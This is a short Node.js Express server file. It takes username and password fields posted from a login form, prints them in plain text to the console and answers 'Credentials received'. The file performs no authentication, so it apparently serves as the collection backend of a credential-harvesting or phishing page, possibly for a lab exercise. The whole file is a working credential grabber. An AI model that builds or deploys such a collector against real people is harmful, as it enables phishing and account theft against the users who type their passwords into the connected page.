// server.mjs
import express from 'express';
import bodyParser from 'body-parser';
import chalk from 'chalk';

const app = express();
const port = 3000;
const localIP = '10.0.1.33'; // Replace with your local IP address

// Middleware to parse incoming JSON or URL-encoded data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Route to handle POST requests from the login form
app.post('/', (req, res) => {
    const { username, password } = req.body;

    // Print credentials in green
    console.log(chalk.green(`Username: ${username}`));
    console.log(chalk.green(`Password: ${password}`));

    // Send a response
    res.send('Credentials received');
});

// Start the server and bind it to the local IP address
app.listen(port, localIP, () => {
    console.log(`Server is running on http://${localIP}:${port}`);
});
